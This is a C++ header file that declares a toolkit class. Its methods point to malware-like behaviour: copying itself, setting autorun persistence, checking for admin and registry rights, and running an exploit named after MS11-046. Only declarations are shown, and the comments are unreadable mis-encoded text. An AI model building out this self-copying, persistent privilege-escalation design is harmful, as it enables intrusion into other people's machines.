#pragma once
#include "stdafx.h"
#include "libsysaux.h"
class CToolKit;


//���˿� ��Ҫ�м���ʵ�ַ���
//�����˼򵥵�Эע���ķ���
//����д��д�ű����ľͶ��� Q.Q~


typedef  INT(CToolKit::*LPFUNC)(VOID);

class CToolKit
{
public:
	CToolKit();
	~CToolKit();

	enum expTable;
	enum expArch;

	int execExp(int order);
	BOOL copySelf();
	BOOL setAutoRun();
	BOOL testRegPrivilege();
	BOOL IsAdmin();
	BOOL IsKeyEdit();
private:

	static LPFUNC funcList[16];
	
	INT exp_ms_11046(VOID);
	BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege);
	int SEU_RandEx(int min, int max);
	
	
	TCHAR executePath[MAX_PATH];
	BOOL bAdmin;
	BOOL bKeyEdit;

};
enum CToolKit::expArch
{
	X86 = 0,
	X64, 
};

enum CToolKit::expTable
{

	EXP_MS_11046 = 0,

};


